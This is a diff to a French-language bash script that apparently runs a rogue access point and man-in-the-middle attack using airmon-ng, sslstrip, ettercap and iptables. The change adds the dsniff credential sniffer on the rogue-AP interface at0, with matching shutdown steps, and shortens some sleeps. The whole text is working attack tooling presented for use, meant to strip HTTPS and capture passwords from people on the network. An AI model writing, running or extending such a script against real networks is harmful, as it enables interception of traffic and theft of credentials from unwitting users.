@@ -14,10 +14,12 @@ killall python
 echo "[+] SSLStrip et SSLStrip Log stoppés"
 pkill ettercap
 echo "[+] Ettercap stoppé"
-sleep 3
+pkill dsniff
+echo "[+] Dsniff stoppé"
+sleep 2
 
 echo "[+] Airmon-ng stoppé"
-sleep 3
+sleep 2
 echo
 echo "0" > /proc/sys/net/ipv4/ip_forward
 iptables --flush
@@ -133,6 +135,12 @@ echo "[+] Configuration et démarrage de SSLStrip Log"
 xterm -geometry 75x15+1+600 -T "SSLStrip Log" -e tail -f sslstrip.log & sslstriplogid=$!
 sleep 3
 
+#SSLStrip Log
+echo "[+] Configuration et démarrage de Dsniff [beta]"
+xterm -xrm '*hold: true' -geometry 75x15+1+600 -T "Dsniff" -e dsniff -i at0 & dsniffid=$!
+disown
+sleep 3
+
 clear
 echo "[+] Initialistion terminée"
 echo
@@ -155,10 +163,12 @@ kill ${ettercapid}
 echo "[+] Ettercap stoppé"
 kill ${sslstriplogid}
 echo "[+] SSLStrip log stoppé"
-sleep 3
+kill ${dsniffid}
+echo "[+] Dsniff stoppé"
+sleep 2
 
 echo "[+] Airmon-ng stoppé"
-sleep 3
+sleep 2
 echo
 echo "0" > /proc/sys/net/ipv4/ip_forward
 iptables --flush
